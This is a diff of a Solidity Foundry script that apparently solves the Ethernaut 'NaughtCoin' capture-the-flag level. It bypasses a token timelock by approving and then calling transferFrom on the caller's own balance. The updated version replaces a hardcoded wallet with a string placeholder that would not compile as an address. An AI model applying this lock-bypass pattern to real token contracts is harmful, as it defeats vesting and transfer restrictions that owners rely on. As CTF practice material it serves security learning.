@@ -16,21 +16,23 @@ interface INaughtCoin {
 }
 
 contract PoC is Script {
-    INaughtCoin level15 =
-        INaughtCoin(0x3212D0421E355a28150991E610d0e01fa7b7Cf66);
+    INaughtCoin naughty =
+        INaughtCoin(0xC595d7C946910835637D23F231441700Be6A25F8);
 
     function run() external {
         uint256 deployer = vm.envUint("PRIVATE_KEY");
-
         vm.startBroadcast(deployer);
-        address myWallet = 0xEAce4b71CA1A128e8B562561f46896D55B9B0246;
-        uint myBal = level15.balanceOf(myWallet);
-        console2.log("Current balance is: ", myBal);
 
-        level15.approve(myWallet, myBal);
-        level15.transferFrom(myWallet, address(level15), myBal);
+        address futurCoinOwner = "your wallet address here";
 
-        console2.log("New balance is: ", level15.balanceOf(myWallet));
+        uint balance = naughty.balanceOf(futurCoinOwner);
+        console2.log("Current balance: ", balance);
+
+        naughty.approve(futurCoinOwner, balance);
+        naughty.transferFrom(futurCoinOwner, address(naughty), balance);
+
+        console2.log("New balance is: ", naughty.balanceOf(futurCoinOwner));
+
         vm.stopBroadcast();
     }
 }
